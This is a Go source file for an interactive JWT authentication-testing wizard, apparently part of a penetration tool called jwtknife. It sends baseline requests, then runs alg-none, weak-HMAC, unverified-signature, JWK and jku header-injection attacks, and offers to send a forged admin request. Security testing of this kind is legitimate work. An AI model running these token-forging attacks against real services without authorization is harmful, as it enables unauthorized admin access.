package wizard

import (
	"bufio"
	"fmt"
	"io"
	"net/url"
	"strings"
	"time"

	jwta "jwtknife/internal/attacks/jwt"
	"jwtknife/internal/httpx"
	"jwtknife/internal/jwtknifejwt"
	"jwtknife/internal/report"
)

func Run(cfg Config, in io.Reader, out io.Writer) (*report.Run, error) {
	rd := bufio.NewReader(in)

	fmt.Fprintln(out, "jwtknife – JWT auth testing wizard\n")

	// ===== JWT input =====
	if strings.TrimSpace(cfg.RawJWT) == "" {
		fmt.Fprint(out, "Paste the JWT (you can include 'Bearer '): ")
		j, _ := rd.ReadString('\n')
		cfg.RawJWT = strings.TrimSpace(j)
	}
	cfg.RawJWT = strings.TrimPrefix(cfg.RawJWT, "Bearer ")

	parsed, err := jwtknifejwt.Parse(cfg.RawJWT)
	if err != nil {
		return nil, err
	}

	run := report.NewRun(time.Now())
	run.JWT.Raw = cfg.RawJWT
	run.JWT.Alg = parsed.Alg
	run.JWT.HasKid = parsed.HasKid
	run.JWT.Kid = parsed.Kid

	fmt.Fprintf(out, "\nDecoded JWT:\n  alg: %s\n", parsed.Alg)
	if parsed.HasKid {
		fmt.Fprintf(out, "  kid: %s\n", parsed.Kid)
	}

	// ===== JWT placement =====
	fmt.Fprintln(out, "\nWhere is the JWT sent?")
	fmt.Fprintln(out, "  1) Authorization: Bearer <token>")
	fmt.Fprintln(out, "  2) Cookie")
	fmt.Fprintln(out, "  3) Custom header")
	fmt.Fprint(out, "Choose [1-3]: ")

	c, _ := rd.ReadString('\n')
	c = strings.TrimSpace(c)

	var placement httpx.JWTPlacement
	switch c {
	case "2":
		fmt.Fprint(out, "Cookie name: ")
		n, _ := rd.ReadString('\n')
		placement = httpx.JWTPlacement{Kind: httpx.PlaceCookie, Name: strings.TrimSpace(n)}
	case "3":
		fmt.Fprint(out, "Header name: ")
		n, _ := rd.ReadString('\n')
		placement = httpx.JWTPlacement{Kind: httpx.PlaceHeader, Name: strings.TrimSpace(n)}
	default:
		placement = httpx.JWTPlacement{Kind: httpx.PlaceAuthorizationBearer}
	}

	// ===== URLs =====
	pubURL := readURL(rd, out, "Public URL (no auth required): ")
	authURL := readURL(rd, out, "JWT-required URL: ")
	adminURL := readURL(rd, out, "Admin-only URL: ")

	// ===== HTTP client =====
	client := httpx.NewClient(httpx.ClientOpts{
		Timeout:         10 * time.Second,
		FollowRedirects: false,
		MaxRequests:     50,
	})

	// ===== Baseline =====
	run.Baseline = report.NewBaseline()

	run.Baseline.Public = report.FromHTTPResult(client.Do(httpx.RequestPlan{
		Label:     "public",
		URL:       pubURL.String(),
		Method:    "GET",
		JWT:       cfg.RawJWT,
		Placement: placement,
	}))
	run.Baseline.Auth = report.FromHTTPResult(client.Do(httpx.RequestPlan{
		Label:     "auth",
		URL:       authURL.String(),
		Method:    "GET",
		JWT:       cfg.RawJWT,
		Placement: placement,
	}))
	run.Baseline.Admin = report.FromHTTPResult(client.Do(httpx.RequestPlan{
		Label:     "admin",
		URL:       adminURL.String(),
		Method:    "GET",
		JWT:       cfg.RawJWT,
		Placement: placement,
	}))

	// ===== Phase 1: automatic attacks =====
	fmt.Fprintln(out, "\nPhase 1: JWT auth attacks")

	input := jwta.AttackInput{
		ParsedJWT: parsed,
		RawJWT:    cfg.RawJWT,
		Client:    client,
		Baseline:  run.Baseline,
		Targets: httpx.Targets{
			PublicURL: pubURL.String(),
			AuthURL:   authURL.String(),
			AdminURL:  adminURL.String(),
			Method:    "GET",
			Placement: placement,
		},
	}

	run.JWTAttacks = []report.AttackResult{
		jwta.NewUnverifiedSignatureAttack().Run(input),
		jwta.NewAlgNoneAttack().Run(input),
		jwta.NewWeakHMACAttack().Run(input),
		jwta.NewJWKHeaderAttack().Run(input),
	}

	// ===== Phase 2: JKU (interactive) =====
	fmt.Fprintln(out, "\n[JKU] JWT Key URL (jku) header injection")

	jkuAttack := jwta.NewJKUAttack()
	preview := jkuAttack.Run(input)
	run.JWTAttacks = append(run.JWTAttacks, preview)

	for _, s := range preview.Steps {
		if s.Label == "host-jwks" {
			fmt.Fprintln(out, "\nSave the following EXACTLY as jwks.json and host it:\n")
			fmt.Fprintln(out, s.JWT.Token)
		}
	}

	fmt.Fprint(out, "\nPaste FULL URL to hosted jwks.json (or press Enter to skip): ")
	cb, _ := rd.ReadString('\n')
	cb = strings.TrimSpace(cb)

	if cb != "" {
		if _, err := url.ParseRequestURI(cb); err != nil {
			fmt.Fprintln(out, "Invalid URL format, skipping JKU attack.")
		} else {
			input.Callback = cb
			run.CallbackBaseURL = cb

			final := jkuAttack.Run(input)

			// Extract forged JWT if present
			var forged string
			for _, s := range final.Steps {
				if s.Label == "forged-jku-jwt" && s.JWT.Token != "" {
					forged = s.JWT.Token
					break
				}
			}

			if forged != "" {
				fmt.Fprintln(out, "\nForged JKU JWT ready.")
				fmt.Fprintln(out, "Choose next action:")
				fmt.Fprintln(out, "  1) Send admin request now")
				fmt.Fprintln(out, "  2) Show forged JWT only")
				fmt.Fprintln(out, "  3) Do nothing / skip")
				fmt.Fprint(out, "Choose [1-3]: ")

				choice, _ := rd.ReadString('\n')
				choice = strings.TrimSpace(choice)

				switch choice {
				case "2":
					fmt.Fprintln(out, "\nForged JWT:")
					fmt.Fprintln(out, forged)
					run.JWTAttacks = append(run.JWTAttacks, final)

				case "3":
					fmt.Fprintln(out, "Skipping JKU request execution.")
					run.JWTAttacks = append(run.JWTAttacks, final)

				default:
					// Default behavior: send request (already executed inside attack)
					run.JWTAttacks = append(run.JWTAttacks, final)
				}
			} else {
				// No forged token produced (should not normally happen)
				run.JWTAttacks = append(run.JWTAttacks, final)
			}
		}
	}

	run.AuthState = report.EvaluateAuthState(run.Baseline, run.JWTAttacks)
	return run, nil
}

func readURL(rd *bufio.Reader, out io.Writer, label string) *url.URL {
	for {
		fmt.Fprint(out, label)
		s, _ := rd.ReadString('\n')
		u, err := url.Parse(strings.TrimSpace(s))
		if err == nil && u.Scheme != "" {
			return u
		}
		fmt.Fprintln(out, "Invalid URL, try again.")
	}
}
